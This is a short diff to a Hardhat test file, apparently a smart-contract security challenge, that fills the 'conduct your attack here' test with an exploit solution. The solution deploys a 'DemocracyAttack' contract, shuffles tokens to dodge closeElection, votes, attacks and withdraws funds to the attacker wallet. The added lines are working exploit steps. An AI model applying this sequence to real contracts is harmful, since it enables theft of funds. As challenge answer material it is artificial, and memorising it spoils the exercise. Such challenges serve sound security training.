@@ -26,7 +26,14 @@ describe(NAME, function () {
       })
 
       it("conduct your attack here", async function () {
-          
+        let Exploit = await ethers.getContractFactory("DemocracyAttack");
+        let exploit = await Exploit.deploy(victimContract.address, attackerWallet.address);
+        await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, exploit.address, 0);
+        // voting with one doesnt trigger closeElection
+        await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+        await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, exploit.address, 1);
+        await exploit.connect(attackerWallet).attack();
+        await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       });
 
       after(async function () {
